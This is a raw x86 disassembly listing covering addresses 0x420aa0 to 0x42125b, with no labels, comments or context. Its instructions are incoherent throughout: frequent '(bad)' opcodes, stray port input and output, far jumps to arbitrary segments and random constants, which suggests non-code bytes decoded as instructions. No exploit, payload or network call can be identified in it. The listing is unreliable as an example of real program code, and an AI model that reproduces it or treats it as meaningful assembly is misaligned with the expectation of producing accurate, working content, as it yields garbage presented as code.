  420aa0:	test   eax,0xc0cd877b
  420aa5:	nop
  420aa6:	test   eax,0xe432895b
  420aab:	adc    eax,0xee8ccf5c
  420ab0:	mov    eax,ds:0x25a29103
  420ab5:	dec    eax
  420ab6:	test   DWORD PTR [ecx-0x3dd7bf83],ebp
  420abc:	xchg   edx,eax
  420abd:	and    al,0x69
  420abf:	fucomi st,st(7)
  420ac1:	fcom   QWORD PTR [ebx-0x18]
  420ac4:	xchg   ebp,eax
  420ac5:	push   ecx
  420ac6:	inc    esi
  420ac7:	or     ebx,edx
  420ac9:	test   al,0x62
  420acb:	sbb    dl,BYTE PTR [bx+di]
  420ace:	(bad)  
  420acf:	in     eax,0x55
  420ad1:	scas   eax,DWORD PTR es:[edi]
  420ad2:	loopne 0x420aab
  420ad4:	out    0x24,eax
  420ad6:	mov    DWORD PTR [edx-0x3e],0x3ccb6c0e
  420add:	cmp    DWORD PTR [ebx+0x2597821a],eax
  420ae3:	dec    eax
  420ae4:	push   ds
  420ae5:	outs   dx,BYTE PTR ds:[esi]
  420ae6:	stc    
  420ae7:	imul   esp,DWORD PTR [ecx+0x6266c1f4],0x2c
  420aee:	rcr    DWORD PTR [edi+eiz*1-0x72e9c14c],cl
  420af5:	sbb    cl,BYTE PTR [eax+ebp*8]
  420af8:	daa    
  420af9:	cdq    
  420afa:	cmc    
  420afb:	mov    al,ds:0x3da96f88
  420b00:	xchg   edi,eax
  420b01:	cmp    eax,0x542af0e5
  420b06:	dec    edx
  420b07:	in     al,0x5
  420b09:	fwait
  420b0a:	push   ebx
  420b0b:	push   ecx
  420b0c:	fild   DWORD PTR [edx+0x5a]
  420b0f:	push   ebx
  420b10:	xchg   ebp,ebx
  420b12:	dec    ebp
  420b13:	and    al,0x9f
  420b15:	mov    al,0x68
  420b17:	ficom  WORD PTR [esi+0x6dc02479]
  420b1d:	push   es
  420b1e:	or     BYTE PTR [ebx+ebp*4-0x2e4898a6],ch
  420b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b26:	(bad)  
  420b28:	mov    al,ds:0xd279e734
  420b2d:	dec    esi
  420b2e:	pushf  
  420b2f:	shl    BYTE PTR [eax+0x15],cl
  420b32:	sbb    al,0x3c
  420b34:	imul   eax,DWORD PTR [eax-0x24],0xf7afe0d5
  420b3b:	test   DWORD PTR [ecx-0x3f942e18],esp
  420b41:	icebp  
  420b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b43:	dec    edx
  420b44:	(bad)  
  420b45:	jmp    0x235a:0xb5163551
  420b4c:	push   edi
  420b4d:	jge    0x420bc1
  420b4f:	cs mov bl,0x80
  420b52:	adc    al,0xca
  420b54:	mov    esp,0x8041253b
  420b59:	push   esi
  420b5a:	mov    edi,DWORD PTR [edi+0x66]
  420b5d:	js     0x420bc1
  420b5f:	pop    esi
  420b60:	sbb    eax,0x820b8862
  420b65:	lock sbb al,0xa6
  420b68:	fnstenv [ebp-0x39c70bd7]
  420b6e:	add    DWORD PTR [edx+0x14],eax
  420b71:	xor    eax,0xf4bd049d
  420b76:	and    BYTE PTR [ecx],dh
  420b78:	add    dh,BYTE PTR [ebp-0x740a7600]
  420b7e:	or     eax,0xcd43b613
  420b83:	xchg   edi,eax
  420b84:	(bad)  
  420b85:	mov    ecx,0x151d110c
  420b8a:	call   0x176:0x60808b05
  420b91:	loope  0x420b8e
  420b93:	addr16 or al,0x46
  420b96:	in     eax,dx
  420b97:	mov    cl,0x9c
  420b99:	rol    BYTE PTR [ebp+0x3cf19fd7],1
  420b9f:	mov    ah,0x24
  420ba1:	cmp    al,0x7e
  420ba4:	popa   
  420ba5:	mov    esp,0x5f2da6d1
  420baa:	and    ebx,DWORD PTR [esi-0x744d5b9b]
  420bb0:	leave  
  420bb1:	dec    edi
  420bb2:	sub    al,0x51
  420bb4:	xchg   ebx,eax
  420bb5:	lods   al,BYTE PTR ds:[esi]
  420bb6:	mov    al,0xb0
  420bb8:	adc    eax,0x251c7ffe
  420bbd:	imul   esi,DWORD PTR [esi],0xffffffef
  420bc0:	ins    BYTE PTR es:[edi],dx
  420bc1:	(bad)  
  420bc2:	stos   DWORD PTR es:[edi],eax
  420bc3:	lock fistp QWORD PTR [edx-0x2921326b]
  420bca:	sub    al,0x55
  420bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bcd:	push   eax
  420bce:	outs   dx,DWORD PTR ds:[esi]
  420bcf:	push   edx
  420bd0:	cld    
  420bd1:	and    al,0x58
  420bd3:	and    eax,DWORD PTR [ecx+0x73bc1368]
  420bd9:	fs hlt 
  420bdb:	rcr    esp,1
  420bdd:	adc    eax,0x34680ce9
  420be2:	or     esp,DWORD PTR ds:0x3124dfd8
  420be8:	push   0x59
  420bea:	bound  edi,QWORD PTR [ebx]
  420bec:	in     al,0xa4
  420bee:	or     ecx,DWORD PTR [ebx-0x3]
  420bf1:	imul   esi,DWORD PTR [edx-0x7e],0x7157f902
  420bf8:	dec    edi
  420bf9:	ffreep st(2)
  420bfb:	ds test al,0x26
  420bfe:	cmp    esi,DWORD PTR [ecx+edx*4-0x5f735036]
  420c05:	ret    0x5f35
  420c08:	push   ebx
  420c09:	fld    QWORD PTR [ecx-0x5cd95681]
  420c0f:	call   0xbc85ba8f
  420c14:	mov    edi,0xff27dfab
  420c19:	sub    eax,0xd0b62437
  420c1e:	or     esp,ebx
  420c20:	inc    DWORD PTR ds:0x46e50566
  420c26:	adc    al,0x95
  420c28:	xchg   esi,eax
  420c29:	fiadd  DWORD PTR [ebx+ebx*4-0x1a]
  420c2d:	jo     0x420c02
  420c2f:	test   al,0xf7
  420c31:	gs test al,0xd8
  420c34:	jle    0x420c0b
  420c36:	(bad)  
  420c37:	pop    esi
  420c38:	xor    al,0xb0
  420c3a:	jp     0x420be7
  420c3c:	add    dh,BYTE PTR [ecx-0x54]
  420c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c40:	and    eax,0xab1b6e22
  420c45:	rol    al,1
  420c47:	imul   ebp,DWORD PTR ds:0x5abe3074,0x46
  420c4e:	sbb    bh,ch
  420c50:	scas   eax,DWORD PTR es:[edi]
  420c51:	rol    DWORD PTR [eax+0x7c1bd80b],1
  420c57:	scas   al,BYTE PTR es:[edi]
  420c58:	pushf  
  420c59:	es sub bh,ch
  420c5c:	sbb    dl,BYTE PTR [edi-0x48c78193]
  420c62:	push   cs
  420c63:	adc    bl,BYTE PTR [ebp-0x37]
  420c66:	pop    edi
  420c67:	cdq    
  420c68:	ja     0x420c29
  420c6a:	daa    
  420c6b:	cli    
  420c6c:	pop    ss
  420c6d:	add    bl,bh
  420c6f:	out    dx,al
  420c70:	pop    eax
  420c71:	xchg   edi,eax
  420c72:	xlat   BYTE PTR ds:[ebx]
  420c73:	outs   dx,BYTE PTR ds:[esi]
  420c74:	cs in  eax,dx
  420c76:	or     DWORD PTR [ecx+0x79],edi
  420c79:	add    eax,0x42c683fa
  420c7e:	pop    ss
  420c7f:	dec    ebx
  420c80:	dec    ebx
  420c81:	loop   0x420c1d
  420c83:	mov    ah,0x4a
  420c85:	dec    ebx
  420c86:	(bad)  
  420c87:	mov    esp,0x32123713
  420c8c:	stos   DWORD PTR es:[edi],eax
  420c8d:	(bad)  
  420c8e:	leave  
  420c8f:	pop    ecx
  420c90:	mov    ecx,0x7994c5c0
  420c95:	adc    BYTE PTR [edx-0x16],cl
  420c98:	pop    ds
  420c99:	fwait
  420c9a:	and    esi,DWORD PTR [esi-0x18e6b2f9]
  420ca0:	popaw  
  420ca2:	(bad)  
  420ca3:	fcmovbe st,st(4)
  420ca5:	fbld   TBYTE PTR [esi+0x5]
  420ca8:	test   bh,dh
  420caa:	je     0x420ca0
  420cac:	lock add bh,bh
  420caf:	ins    DWORD PTR es:[edi],dx
  420cb0:	int3   
  420cb1:	daa    
  420cb2:	jns    0x420d00
  420cb4:	adc    BYTE PTR [ebx-0x6f609a6e],al
  420cba:	mov    dl,0xb7
  420cbc:	push   esi
  420cbd:	pop    edx
  420cbe:	push   0xffffffaa
  420cc0:	fwait
  420cc1:	push   cs
  420cc2:	add    esp,DWORD PTR [edx+0x4f]
  420cc5:	push   ecx
  420cc6:	jb     0x420cce
  420cc8:	xchg   edi,eax
  420cc9:	mov    ch,0x30
  420ccb:	in     al,0xf3
  420ccd:	xchg   edi,eax
  420cce:	shl    ebp,1
  420cd0:	outs   dx,DWORD PTR ds:[esi]
  420cd1:	inc    ebx
  420cd2:	int    0x25
  420cd4:	mov    edx,0x2a2714a
  420cd9:	aam    0xff
  420cdb:	into   
  420cdc:	add    al,0xb7
  420cde:	push   0xbca3d3d6
  420ce3:	scas   eax,DWORD PTR es:[edi]
  420ce4:	int    0x4a
  420ce6:	push   edx
  420ce7:	pop    esi
  420ce8:	and    BYTE PTR [eax-0x1b],dh
  420ceb:	fucom  st(4)
  420ced:	dec    edi
  420cee:	cmp    eax,0x9e0dbd54
  420cf3:	shr    BYTE PTR [ebx],0xf1
  420cf6:	mov    dl,0xfa
  420cf8:	xchg   ecx,esp
  420cfa:	(bad)  
  420cfb:	jle    0x420d1f
  420cfd:	ins    BYTE PTR es:[edi],dx
  420cfe:	jnp    0x420d45
  420d00:	mov    edi,0xff3196f3
  420d05:	or     DWORD PTR [edi-0x6d],eax
  420d08:	jmp    FWORD PTR [esi]
  420d0a:	adc    BYTE PTR [edx+esi*8+0x14],ah
  420d0e:	add    al,0xc4
  420d10:	sbb    eax,0x7b31f764
  420d15:	inc    ebp
  420d16:	call   0xb8348aa7
  420d1b:	jl     0x420d76
  420d1d:	retf   0x5306
  420d20:	pushf  
  420d21:	jmp    0x2fa6:0x5cae7e35
  420d28:	jle    0x420d91
  420d2a:	dec    esp
  420d2b:	sbb    eax,0x3bd6fe15
  420d30:	popa   
  420d31:	fwait
  420d32:	enter  0xd031,0x4c
  420d36:	sub    ecx,DWORD PTR [ebx-0x4acfebab]
  420d3c:	in     eax,dx
  420d3d:	mov    ecx,DWORD PTR [ebx+0x184c5437]
  420d43:	leave  
  420d44:	pop    edi
  420d45:	fldln2 
  420d47:	inc    esi
  420d48:	(bad)  
  420d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4b:	dec    ecx
  420d4c:	std    
  420d4d:	sbb    al,0x43
  420d4f:	(bad)  
  420d50:	jnp    0x420cdd
  420d52:	inc    esi
  420d53:	out    dx,al
  420d54:	fwait
  420d55:	sub    BYTE PTR [edi-0x1e8c0dc],0x5c
  420d5c:	cmp    eax,0x4392c7f3
  420d61:	inc    esi
  420d62:	inc    esp
  420d63:	sbb    esi,esi
  420d65:	fstp   TBYTE PTR [ebx+0x2d]
  420d68:	push   es
  420d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d6a:	mov    al,ds:0x706c9e2f
  420d6f:	sbb    DWORD PTR [esi],esp
  420d71:	stc    
  420d72:	sub    ecx,DWORD PTR [edi+0x6f]
  420d75:	retf   
  420d76:	mov    eax,ds:0x75ce4ed5
  420d7b:	jg     0x420d33
  420d7d:	inc    esp
  420d7e:	test   eax,0xd99289b
  420d83:	les    ecx,FWORD PTR [edi]
  420d85:	xchg   ebx,eax
  420d86:	pop    ecx
  420d87:	out    0x47,eax
  420d89:	dec    edi
  420d8a:	les    esi,FWORD PTR [edi+0x67]
  420d8d:	hlt    
  420d8e:	(bad)  
  420d8f:	test   eax,0x86ceb62
  420d94:	loope  0x420d30
  420d96:	inc    edx
  420d97:	call   DWORD PTR [ecx+0x2cc30c5]
  420d9d:	dec    esi
  420d9e:	and    ah,cl
  420da0:	dec    ebp
  420da1:	bound  esi,QWORD PTR [edi+eax*8+0x33]
  420da5:	or     ebx,esi
  420da7:	inc    eax
  420da8:	push   cs
  420da9:	xor    dl,BYTE PTR ds:0x8160543
  420daf:	or     DWORD PTR [ebx+0x12],eax
  420db2:	daa    
  420db3:	push   edx
  420db4:	mov    esi,0x4027221e
  420db9:	test   eax,0xda92baec
  420dbe:	sbb    cl,BYTE PTR [edx-0x5722d9c]
  420dc4:	dec    edi
  420dc5:	aad    0xb7
  420dc7:	mov    ah,0xc8
  420dc9:	loope  0x420df5
  420dcb:	mov    bl,0x65
  420dcd:	xchg   esp,eax
  420dce:	(bad)  
  420dcf:	cmp    eax,DWORD PTR [edi]
  420dd1:	adc    BYTE PTR [eax-0x27],cl
  420dd4:	dec    eax
  420dd5:	dec    edx
  420dd6:	in     eax,0x12
  420dd8:	add    DWORD PTR [eax-0x53a2e672],eax
  420dde:	bound  edi,QWORD PTR [esi]
  420de0:	jae    0x420e21
  420de2:	clc    
  420de3:	sub    al,BYTE PTR ds:0xe238350c
  420de9:	cmp    eax,0x3304b2d2
  420dee:	dec    edi
  420def:	push   ds
  420df0:	push   ebp
  420df1:	mov    ebx,DWORD PTR ds:0xd752f3be
  420df7:	mov    ss,ecx
  420df9:	cmp    cl,BYTE PTR [ecx+0x30eb487e]
  420dff:	mov    ss,WORD PTR [eax+0x35]
  420e02:	xor    eax,0xb3b93185
  420e07:	cmp    eax,0xf199dde2
  420e0c:	jg     0x420e34
  420e0e:	out    dx,eax
  420e0f:	lahf   
  420e10:	mov    bl,0xc7
  420e12:	push   eax
  420e13:	nop
  420e14:	push   esp
  420e15:	xchg   edi,eax
  420e16:	mov    bl,0xb7
  420e18:	rcl    DWORD PTR [eax+0x6c],cl
  420e1b:	push   edi
  420e1c:	sub    eax,edi
  420e1e:	adc    DWORD PTR [edx+0x26386315],ebx
  420e24:	mov    dh,0xc7
  420e26:	(bad)  
  420e27:	fdiv   st(4),st
  420e29:	push   0xfffffff1
  420e2b:	sar    bl,1
  420e2d:	popa   
  420e2e:	mov    edi,0xc98024e1
  420e33:	loopne 0x420eb0
  420e35:	repz aad 0xe3
  420e38:	icebp  
  420e39:	lahf   
  420e3a:	js     0x420ea8
  420e3c:	sbb    ch,BYTE PTR [ecx-0x66]
  420e3f:	push   cs
  420e40:	add    al,0x4d
  420e42:	jmp    0x420dfd
  420e44:	dec    esi
  420e45:	mov    ds:0xb7deb3f1,al
  420e4a:	test   BYTE PTR [edi],ch
  420e4c:	stc    
  420e4d:	int3   
  420e4e:	clc    
  420e4f:	and    esp,DWORD PTR gs:[edi-0x42]
  420e53:	inc    ebx
  420e54:	pop    edi
  420e55:	xchg   ecx,eax
  420e56:	push   cs
  420e57:	(bad)  
  420e58:	bnd jg 0x420eba
  420e5b:	push   ebx
  420e5c:	pop    esi
  420e5d:	xchg   edi,eax
  420e5e:	sbb    BYTE PTR [edi+0x2],bl
  420e61:	sub    al,0xbc
  420e63:	and    BYTE PTR [esi-0x3a],cl
  420e66:	out    dx,al
  420e67:	mov    al,0x4f
  420e69:	ins    BYTE PTR es:[edi],dx
  420e6a:	mov    bh,BYTE PTR [eax+esi*4+0x53]
  420e6e:	inc    esp
  420e6f:	(bad)  
  420e70:	in     al,0xae
  420e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e73:	mov    DWORD PTR [edi-0x9],ecx
  420e76:	pop    eax
  420e77:	jg     0x420e7a
  420e79:	adc    dl,ah
  420e7b:	or     ecx,ecx
  420e7d:	lods   eax,DWORD PTR ds:[esi]
  420e7e:	xchg   ebx,eax
  420e7f:	inc    edx
  420e80:	mov    dl,BYTE PTR [esi+ebx*4-0x74]
  420e84:	sbb    cl,BYTE PTR [esi+0x43]
  420e87:	imul   ebp,DWORD PTR [eax],0x4e
  420e8a:	inc    edx
  420e8b:	or     DWORD PTR [ecx],edx
  420e8d:	mov    al,ds:0xf083802d
  420e92:	ins    BYTE PTR es:[edi],dx
  420e93:	adc    al,0x28
  420e95:	push   0xffffffef
  420e97:	dec    ecx
  420e98:	mov    DWORD PTR [esi+0x4a],esp
  420e9b:	xchg   esp,eax
  420e9c:	mov    dh,0x66
  420e9e:	out    dx,al
  420e9f:	hlt    
  420ea0:	jno    0x420ea2
  420ea2:	scas   al,BYTE PTR es:[edi]
  420ea3:	ja     0x420ef8
  420ea5:	adc    BYTE PTR ds:0x2c21c0ca,cl
  420eab:	mov    ds:0x5cc301bf,al
  420eb0:	mov    DWORD PTR [eax],esi
  420eb2:	hlt    
  420eb3:	sbb    esi,DWORD PTR [esi-0x4ba4d543]
  420eb9:	lds    edi,FWORD PTR [edx]
  420ebb:	add    edi,DWORD PTR [ebp-0x429986a4]
  420ec1:	shl    DWORD PTR [ebp+0x3d382970],cl
  420ec7:	loope  0x420ea6
  420ec9:	daa    
  420eca:	pushf  
  420ecb:	sbb    al,0xaa
  420ecd:	adc    cl,dh
  420ecf:	push   0xffffff86
  420ed1:	lock xchg esp,eax
  420ed3:	das    
  420ed4:	cmp    eax,0x38e05691
  420ed9:	pop    es
  420eda:	in     al,0xf2
  420edc:	mov    esp,0xd2d4c779
  420ee1:	cmp    bl,BYTE PTR [ecx+0x4c01d131]
  420ee7:	inc    esi
  420ee8:	repz dec esp
  420eea:	or     bh,BYTE PTR [ebx]
  420eec:	test   DWORD PTR [ebx],0xb22f8019
  420ef2:	dec    esi
  420ef3:	and    DWORD PTR [ecx],0x86d56439
  420ef9:	cdq    
  420efa:	lea    edx,[edi-0x79]
  420efd:	and    dh,dh
  420eff:	or     dl,BYTE PTR [ebx-0x72]
  420f02:	pop    ecx
  420f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f04:	push   esp
  420f05:	out    0xd4,al
  420f07:	in     eax,0x49
  420f09:	int3   
  420f0a:	(bad)  
  420f0b:	xchg   ebp,eax
  420f0c:	xchg   DWORD PTR [eax],eax
  420f0e:	arpl   WORD PTR [eax-0xc6ae683],di
  420f14:	arpl   WORD PTR [ebp-0x49],cx
  420f17:	retf   
  420f18:	xor    eax,0x5a3ab0c1
  420f1d:	xchg   BYTE PTR [esi],cl
  420f1f:	lock inc ebx
  420f21:	sub    ebx,DWORD PTR [ebx-0x4a9a0fb6]
  420f27:	nop
  420f28:	loope  0x420f1b
  420f2a:	mov    eax,ds:0xba3aed53
  420f2f:	(bad)  
  420f30:	fldenv [eax+0x62]
  420f33:	ficomp WORD PTR [ebp-0x17]
  420f36:	arpl   WORD PTR [esi+ebp*1-0x7fca0dea],dx
  420f3d:	aam    0xfb
  420f3f:	adc    ch,dl
  420f41:	inc    esi
  420f42:	mov    WORD PTR [esi],cs
  420f44:	cmp    esp,ecx
  420f46:	xchg   ebx,eax
  420f47:	sbb    BYTE PTR [edi+0x29],cl
  420f4a:	fmul   QWORD PTR [eax+0x4a9f2427]
  420f50:	jecxz  0x420edc
  420f52:	push   cs
  420f53:	ss lahf 
  420f55:	jle    0x420faa
  420f57:	jnp    0x420f0b
  420f59:	add    al,0xd
  420f5b:	imul   esi,edx,0xb
  420f5e:	fwait
  420f5f:	popa   
  420f60:	lock dec ecx
  420f62:	adc    BYTE PTR [ecx+0x46608452],al
  420f68:	sbb    esi,DWORD PTR [edi]
  420f6a:	call   ebp
  420f6c:	mov    al,0xc
  420f6e:	in     al,0xdf
  420f70:	jp     0x420fdb
  420f72:	jns    0x420fb2
  420f74:	out    0x7a,eax
  420f76:	add    bh,0x8a
  420f79:	xor    BYTE PTR [esi+edx*2],al
  420f7c:	icebp  
  420f7d:	or     BYTE PTR [esp+edx*2],al
  420f80:	xor    eax,ecx
  420f82:	mov    ss,WORD PTR [edx]
  420f84:	and    ebx,esi
  420f86:	loop   0x420f84
  420f88:	ss out 0xf7,eax
  420f8b:	out    dx,eax
  420f8c:	std    
  420f8d:	inc    ebx
  420f8e:	lods   al,BYTE PTR ds:[esi]
  420f8f:	in     eax,dx
  420f90:	ja     0x420fc9
  420f92:	mov    ecx,DWORD PTR [eax+0x1a4ddc71]
  420f98:	mov    eax,0x58c69a36
  420f9d:	sbb    al,0x1d
  420f9f:	and    eax,0xf5de2742
  420fa4:	adc    BYTE PTR [esi+0x48],bl
  420fa7:	outs   dx,BYTE PTR ds:[esi]
  420fa8:	std    
  420fa9:	push   cs
  420faa:	mov    eax,ds:0xb7dd0583
  420faf:	(bad)  
  420fb0:	div    ah
  420fb2:	shr    dl,0xfc
  420fb5:	or     dl,dl
  420fb7:	sbb    dh,BYTE PTR [eax+eax*1+0x2d]
  420fbb:	inc    ebp
  420fbc:	retf   
  420fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fbe:	call   0xa7e9dfa
  420fc3:	push   es
  420fc4:	pop    ds
  420fc5:	mov    al,ds:0x332101f3
  420fca:	dec    edi
  420fcb:	inc    edx
  420fcc:	add    eax,0xe7536251
  420fd1:	int    0x56
  420fd3:	xchg   DWORD PTR [edx],ecx
  420fd5:	bound  ecx,QWORD PTR [eax]
  420fd7:	add    BYTE PTR [eax-0x28e2df96],bh
  420fdd:	ss aas 
  420fdf:	mul    DWORD PTR [ecx+ecx*8]
  420fe2:	outs   dx,BYTE PTR ds:[esi]
  420fe3:	loope  0x421009
  420fe5:	jmp    0x85b7f2d8
  420fea:	xor    BYTE PTR [edx],0x79
  420fed:	int    0x2e
  420fef:	add    DWORD PTR [eax],0x31
  420ff2:	mov    fs,WORD PTR ds:0x6311e726
  420ff8:	nop
  420ff9:	das    
  420ffa:	aam    0x7f
  420ffc:	mov    ebp,0x30772d1f
  421001:	ds test bl,0x83
  421005:	adc    eax,0x98a17bae
  42100a:	stos   BYTE PTR es:[edi],al
  42100b:	stc    
  42100c:	mov    esi,0x612c924
  421011:	dec    edx
  421012:	cwde   
  421013:	push   0x4
  421015:	jbe    0x420fdb
  421017:	retf   
  421018:	dec    esi
  421019:	cmc    
  42101a:	fwait
  42101b:	push   esi
  42101c:	retf   0xa48
  42101f:	cwde   
  421020:	fsub   st(5),st
  421022:	jmp    0xdf3d:0x8cb22d01
  421029:	or     ebp,0x70
  42102c:	mov    dh,0x8c
  42102e:	lock pushf 
  421030:	mov    edi,0xd4671a8c
  421035:	shr    BYTE PTR [ebx],cl
  421037:	or     DWORD PTR [ebp-0x5a4c6617],esp
  42103d:	sub    al,0xad
  42103f:	mov    dl,0xb5
  421041:	test   al,0xcc
  421043:	jo     0x420ffa
  421045:	xchg   esp,eax
  421046:	icebp  
  421047:	mov    esi,0xe0c4fda6
  42104c:	repz add eax,0x8d7ae4f
  421052:	pop    ss
  421053:	sahf   
  421054:	push   es
  421055:	inc    ebp
  421056:	fcmovnb st,st(1)
  421058:	loopne 0x421016
  42105a:	iret   
  42105b:	jo     0x42103a
  42105d:	xchg   ebx,eax
  42105e:	test   al,0x78
  421060:	push   ds
  421061:	clc    
  421062:	mov    esi,0xf76a551e
  421067:	jno    0x421022
  421069:	sar    BYTE PTR [esi-0x1c],1
  42106c:	nop
  42106d:	xor    al,0x6f
  42106f:	ss cmp eax,0x32c1877
  421075:	fidiv  DWORD PTR [ebp+0xc]
  421078:	in     eax,0x74
  42107a:	ins    DWORD PTR es:[edi],dx
  42107b:	xor    dl,BYTE PTR [esi+0x5ea7684a]
  421081:	retf   0xbeb8
  421084:	mov    ecx,0x73dbc32b
  421089:	inc    eax
  42108a:	repnz inc BYTE PTR [eax+0x49]
  42108e:	pop    ecx
  42108f:	dec    edi
  421090:	adc    BYTE PTR [ebp-0x30401d22],dl
  421096:	mov    dh,0x1d
  421098:	loope  0x4210a7
  42109a:	inc    di
  42109c:	daa    
  42109d:	mov    ?,WORD PTR [ecx+0x34]
  4210a0:	loope  0x421034
  4210a2:	jo     0x4210e2
  4210a4:	mov    esp,0x42c08fba
  4210a9:	mov    eax,0xa7794965
  4210ae:	sub    BYTE PTR [ebp+0x49],bl
  4210b1:	mov    BYTE PTR [ecx],bl
  4210b3:	arpl   di,bp
  4210b5:	mov    ah,0x56
  4210b7:	mov    dl,0xa8
  4210b9:	and    al,0x89
  4210bb:	ja     0x2c3dc191
  4210c1:	sbb    al,0xb0
  4210c3:	pop    esp
  4210c4:	jns    0x4210d8
  4210c6:	push   ds
  4210c7:	pop    edi
  4210c8:	adc    eax,0xe8af794
  4210cd:	ficomp WORD PTR [eax+0x54]
  4210d0:	cmp    al,0x9c
  4210d2:	pop    ebx
  4210d3:	and    bh,BYTE PTR ds:0xd114af6a
  4210d9:	pop    es
  4210da:	fcmovb st,st(5)
  4210dc:	aaa    
  4210dd:	out    dx,al
  4210de:	jne    0x42111b
  4210e0:	(bad)  
  4210e1:	lods   al,BYTE PTR ds:[esi]
  4210e2:	adc    BYTE PTR [eax+0xc9865aa],dh
  4210e8:	cs jecxz 0x421078
  4210eb:	nop
  4210ec:	dec    edx
  4210ed:	xor    BYTE PTR [edx+0x8c4b13b],dh
  4210f3:	adc    al,0x27
  4210f5:	pop    esp
  4210f6:	sub    ecx,DWORD PTR [edi+eiz*1]
  4210f9:	test   edi,esi
  4210fb:	mov    ds:0x259339f3,al
  421100:	cmp    eax,0xf6108bc2
  421105:	mov    edi,0xa43ac941
  42110a:	sub    edx,DWORD PTR [edi-0x60e7a074]
  421110:	pushf  
  421111:	jns    0x4210bd
  421113:	mov    esi,0x8d40f830
  421118:	ds std 
  42111a:	push   esi
  42111b:	mov    cl,0x14
  42111d:	jns    0x421180
  42111f:	scas   eax,DWORD PTR es:[edi]
  421120:	mov    ebp,0x6e90e1f8
  421125:	adc    al,0x6e
  421127:	cdq    
  421128:	hlt    
  421129:	sub    cl,0xdf
  42112c:	cmp    esp,ebp
  42112e:	xor    al,0x12
  421130:	sbb    al,0x8d
  421132:	(bad)  
  421133:	gs loop 0x4211a6
  421136:	arpl   WORD PTR [edi+0x7f],ax
  421139:	es push edi
  42113b:	cs daa 
  42113d:	jns    0x4210ec
  42113f:	mov    bh,0x52
  421141:	or     BYTE PTR [ebx+esi*2],ah
  421144:	or     DWORD PTR [edi+0x40],esp
  421147:	retf   0x921b
  42114a:	xor    al,0xcc
  42114c:	pop    eax
  42114d:	mov    edi,0xa9cdf4f0
  421152:	mov    esp,0xdcc532d6
  421157:	xor    ebp,DWORD PTR [ebx*2-0x369236]
  42115e:	enter  0x7a04,0x5d
  421162:	aas    
  421163:	xor    al,BYTE PTR [ebp-0x67]
  421166:	push   0x33
  421168:	fimul  WORD PTR [eax+0x6adbd0f3]
  42116e:	iret   
  42116f:	mov    al,ds:0x83c8ba5b
  421174:	es pop ds
  421176:	ret    0xe848
  421179:	mov    esi,0xcac2f6da
  42117e:	loop   0x4211e0
  421180:	pushf  
  421181:	cmp    edx,eax
  421183:	loopne 0x421136
  421185:	xchg   ebx,eax
  421186:	out    dx,al
  421187:	lea    esi,[ebp-0x33799098]
  42118d:	(bad)  
  42118e:	out    dx,al
  42118f:	(bad)  [edi+0x2fc4d3f0]
  421195:	pop    esp
  421196:	lods   eax,DWORD PTR ds:[esi]
  421197:	addr16 pop ebx
  421199:	pop    ss
  42119a:	xor    al,0xea
  42119c:	sbb    eax,0x8822931a
  4211a1:	call   0xc1a351a6
  4211a6:	popa   
  4211a7:	xor    al,0xa1
  4211a9:	popf   
  4211aa:	sub    dl,ch
  4211ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ad:	outs   dx,BYTE PTR ds:[esi]
  4211ae:	and    BYTE PTR [edx+0x69a92abf],dl
  4211b4:	add    edi,esi
  4211b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211b7:	push   esp
  4211b8:	fstp   DWORD PTR [edi]
  4211ba:	das    
  4211bb:	sbb    ah,ch
  4211bd:	out    dx,eax
  4211be:	push   edi
  4211bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211c0:	cld    
  4211c1:	call   FWORD PTR [ebx+ebp*4]
  4211c4:	imul   esp,DWORD PTR [ecx+ebx*2-0x519495af],0x5
  4211cc:	add    cl,BYTE PTR [ebx]
  4211ce:	push   edi
  4211cf:	test   eax,0x269afe1e
  4211d4:	pop    edi
  4211d5:	xor    DWORD PTR [ebx],0xffffffe0
  4211d8:	js     0x421184
  4211da:	xor    esp,DWORD PTR [ecx+edi*2-0x7ebaa801]
  4211e1:	loop   0x4211f9
  4211e3:	xchg   BYTE PTR [edi-0x16],cl
  4211e6:	enter  0x9af,0xee
  4211ea:	sbb    DWORD PTR [ebx+0x664be088],edx
  4211f0:	repnz out 0xdd,eax
  4211f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f4:	mov    cl,0x84
  4211f6:	sub    eax,0x59bbc579
  4211fb:	sub    DWORD PTR [ecx-0x2c],esi
  4211fe:	mov    DWORD PTR [edi+esi*1-0x4ac9b997],esp
  421205:	aas    
  421206:	stc    
  421207:	inc    ebx
  421208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421209:	inc    eax
  42120a:	test   eax,0xc0dc97d3
  42120f:	pop    esp
  421210:	sub    DWORD PTR [ebx+0x70],0x2
  421214:	jmp    0x7d4bc4e0
  421219:	std    
  42121a:	les    ebx,FWORD PTR [esi+0x54]
  42121d:	xor    eax,0x2072a4d5
  421222:	sbb    DWORD PTR [ecx+0x7717de12],ebx
  421228:	std    
  421229:	lahf   
  42122a:	cli    
  42122b:	stc    
  42122c:	or     al,0x20
  42122e:	push   eax
  42122f:	shl    DWORD PTR [edx-0x1e],0x48
  421233:	dec    ebx
  421234:	xchg   edi,eax
  421235:	arpl   WORD PTR [ecx],bx
  421237:	jnp    0x421292
  421239:	call   0xa866:0x76790de
  421240:	outs   dx,BYTE PTR ds:[esi]
  421241:	jne    0x42121e
  421243:	bound  esp,QWORD PTR [edi+eiz*8]
  421246:	push   ds
  421247:	mov    ?,WORD PTR [edx+0x7ae6fb3a]
  42124d:	popa   
  42124e:	inc    eax
  42124f:	shl    DWORD PTR [eax],cl
  421251:	int    0x11
  421253:	je     0x4211e2
  421255:	jmp    FWORD PTR [ecx-0x2bd13e90]
  42125b:	xor    DWORD PTR [edi+esi*8+0x6c],ecx
